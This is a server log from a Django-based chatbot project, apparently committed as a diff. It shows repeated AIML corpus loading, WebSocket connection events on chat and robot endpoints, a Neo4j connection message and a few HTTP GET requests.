+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1621 - - [26/Mar/2019:14:11:31] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1239 - - [26/Mar/2019:14:11:35] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1239 - - [26/Mar/2019:14:11:35] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1239 - - [26/Mar/2019:14:20:21] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1763 - - [26/Mar/2019:14:21:58] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1763 - - [26/Mar/2019:14:21:58] "WSCONNECT /ws/chat/1/" - -
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+71.6.167.142:41541 - - [26/Mar/2019:14:25:16] "GET /" 200 12678
+71.6.167.142:43188 - - [26/Mar/2019:14:25:28] "GET /favicon.ico" 404 9022
+112.10.182.189:1763 - - [26/Mar/2019:14:33:06] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1149 - - [26/Mar/2019:14:33:06] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1149 - - [26/Mar/2019:14:33:06] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1149 - - [26/Mar/2019:14:33:08] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1150 - - [26/Mar/2019:14:33:08] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1150 - - [26/Mar/2019:14:33:08] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1218 - - [26/Mar/2019:14:34:44] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1218 - - [26/Mar/2019:14:34:44] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1150 - - [26/Mar/2019:14:35:07] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1228 - - [26/Mar/2019:14:35:07] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1228 - - [26/Mar/2019:14:35:07] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1228 - - [26/Mar/2019:14:37:15] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1297 - - [26/Mar/2019:14:37:15] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1297 - - [26/Mar/2019:14:37:15] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1218 - - [26/Mar/2019:14:37:27] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1306 - - [26/Mar/2019:14:37:28] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1306 - - [26/Mar/2019:14:37:28] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1306 - - [26/Mar/2019:14:37:57] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1314 - - [26/Mar/2019:14:37:58] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1314 - - [26/Mar/2019:14:37:58] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1297 - - [26/Mar/2019:14:39:59] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1314 - - [26/Mar/2019:14:40:07] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1398 - - [26/Mar/2019:14:40:08] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1398 - - [26/Mar/2019:14:40:08] "WSCONNECT /ws/chat/YS19032500/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1398 - - [26/Mar/2019:14:41:37] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1465 - - [26/Mar/2019:14:41:37] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1465 - - [26/Mar/2019:14:41:37] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1465 - - [26/Mar/2019:14:41:59] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1591 - - [26/Mar/2019:14:44:48] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1591 - - [26/Mar/2019:14:44:48] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1598 - - [26/Mar/2019:14:44:59] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1598 - - [26/Mar/2019:14:44:59] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1614 - - [26/Mar/2019:14:45:16] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1614 - - [26/Mar/2019:14:45:16] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1598 - - [26/Mar/2019:14:45:56] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1633 - - [26/Mar/2019:14:45:56] "WSCONNECTING /ws/chat/1/" - -
+112.10.182.189:1633 - - [26/Mar/2019:14:45:56] "WSCONNECT /ws/chat/1/" - -
+112.10.182.189:1614 - - [26/Mar/2019:14:46:14] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1651 - - [26/Mar/2019:14:46:14] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1651 - - [26/Mar/2019:14:46:14] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1651 - - [26/Mar/2019:14:47:44] "WSDISCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1711 - - [26/Mar/2019:14:47:45] "WSCONNECTING /ws/chat/YS19032500/" - -
+112.10.182.189:1711 - - [26/Mar/2019:14:47:45] "WSCONNECT /ws/chat/YS19032500/" - -
+112.10.182.189:1633 - - [26/Mar/2019:14:47:55] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1591 - - [26/Mar/2019:14:47:55] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1724 - - [26/Mar/2019:14:47:59] "WSCONNECTING /robot/748500.2615873578248693/" - -
+112.10.182.189:1724 - - [26/Mar/2019:14:47:59] "WSCONNECT /robot/748500.2615873578248693/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
